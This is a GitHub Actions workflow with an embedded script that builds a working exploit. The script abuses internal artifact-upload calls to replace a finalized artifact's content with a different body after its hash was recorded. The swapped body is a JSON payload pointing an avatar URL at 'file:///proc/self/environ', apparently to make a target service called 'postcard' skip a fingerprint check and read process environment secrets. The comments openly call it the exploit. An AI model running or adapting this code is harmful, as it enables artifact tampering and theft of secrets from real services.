name: rc-textplain
on:
  workflow_dispatch:
  push:
permissions:
  actions: write
  contents: read
jobs:
  carrier:
    runs-on: ubuntu-latest
    steps:
      - name: deps
        run: npm install --no-save --no-audit --no-fund @actions/artifact@6.3.1
      - name: build text/plain carrier
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ github.token }}
        with:
          script: |
            // Creates one v7 raw artifact with MIME text/plain carrying the exploit payload.
            // Why: a non-JSON live Content-Type makes sourceFingerprint() skip the
            // single-slash repositoryName regex, so sourceSha256 becomes sha256(payload).
            // If the deployed postcard enforces its media_type check this is rejected;
            // if it does not, this is the whole exploit.
            const {createHash} = await import('node:crypto');
            const https = (await import('node:https')).default;
            const WS = process.env.GITHUB_WORKSPACE || process.cwd();
            const {internalArtifactTwirpClient} = await import(`${WS}/node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js`);
            const {getBackendIdsFromToken} = await import(`${WS}/node_modules/@actions/artifact/lib/internal/shared/util.js`);
            const {StringValue} = await import(`${WS}/node_modules/@actions/artifact/lib/generated/index.js`);

            const ids = getBackendIdsFromToken();
            const client = internalArtifactTwirpClient({maxAttempts: 1});
            const repo = process.env.GITHUB_REPOSITORY;
            const stamp = process.env.GITHUB_RUN_ID;
            const sha = b => createHash('sha256').update(b).digest('hex');

            const req = (url, method = 'GET', body = null, headers = {}) => new Promise((res, rej) => {
              const u = new URL(url);
              const r = https.request(u, {method, headers, timeout: 25000}, resp => {
                const c = []; resp.on('data', d => c.push(d));
                resp.on('end', () => res({status: resp.statusCode, headers: resp.headers, raw: resp.rawHeaders, body: Buffer.concat(c)}));
              });
              r.on('error', rej); r.on('timeout', () => r.destroy(new Error('timeout')));
              if (body) r.write(body); r.end();
            });

            async function make(label, mime) {
              const name = `rc-${label}-${stamp}`;
              const out = {label, mime};
              const created = await client.CreateArtifact({...ids, name, version: 7, mimeType: StringValue.create({value: mime})});
              if (!created.ok) throw new Error('CreateArtifact ok=false for ' + mime);
              const up = created.signedUploadUrl;
              const placeholder = Buffer.from('{}');
              out.put = (await req(up, 'PUT', placeholder, {'x-ms-blob-type': 'BlockBlob', 'Content-Length': '2'})).status;
              const fin = await client.FinalizeArtifact({...ids, name, size: '2', hash: StringValue.create({value: `sha256:${sha(placeholder)}`})});
              if (!fin.ok) throw new Error('FinalizeArtifact ok=false');
              const artifactId = String(fin.artifactId);
              const body = Buffer.from(JSON.stringify({
                full_name: `${repo}/actions/artifacts/${artifactId}/zip`,
                owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
                description: 'repo cassette',
                stargazers_count: 0,
              }));
              out.put2 = (await req(up, 'PUT', body, {'x-ms-blob-type': 'BlockBlob', 'Content-Length': String(body.length)})).status;
              out.path = `${repo}/actions/artifacts/${artifactId}/zip`;
              out.payloadSha = sha(body);
              const api = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`, 'GET', null, {
                Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
                Accept: 'application/vnd.github.v3+json',
                'User-Agent': 'rc-textplain',
              });
              out.restStatus = api.status;
              if (api.status === 302 && api.headers.location) {
                const final = await req(new URL(api.headers.location).href);
                out.finalCt = (final.headers['content-type'] || '');
                out.finalCtHex = Buffer.from(final.headers['content-type'] || '', 'latin1').toString('hex');
                out.bodyMatch = final.body.equals(body);
              }
              console.log('RCTEXT ' + JSON.stringify(out));
              return out;
            }
            await make('tp', 'text/plain');
            console.log('RCTEXT DONE');
